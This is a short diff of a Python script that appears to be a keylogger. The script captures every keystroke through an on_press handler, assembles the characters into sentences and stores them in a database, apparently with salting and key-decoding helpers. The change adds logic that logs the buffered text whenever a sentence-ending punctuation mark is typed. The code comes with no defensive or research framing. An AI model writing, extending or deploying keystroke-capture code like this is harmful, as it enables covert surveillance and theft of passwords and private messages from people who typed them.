@@ -10,9 +10,11 @@ from src.decoding_example import retrieve_and_decode_key
 current_sentence = ""
 shift_pressed = False
 
+
 def generate_salt(length=8):
     # Generate a random salt of the specified length
     return os.urandom(length)
+
 
 def log_sentence(sentence):
     connection = connect_to_db()
@@ -47,6 +49,7 @@ def log_sentence(sentence):
             cursor.close()
             connection.close()
 
+
 def on_press(key):
     global current_sentence, shift_pressed
 
@@ -64,11 +67,15 @@ def on_press(key):
             if key.char:
                 if shift_pressed and key.char.isalpha():
                     current_sentence += key.char.upper()
+                elif key.char == '.' or key.char == '!' or key.char == '?':
+                    log_sentence(current_sentence)
+                    current_sentence = ""  # Reset the current sentence`
                 else:
                     current_sentence += key.char
     except AttributeError:
         # Handle other special keys like arrow keys, function keys, etc.
         pass
+
 
 def on_release(key):
     global shift_pressed
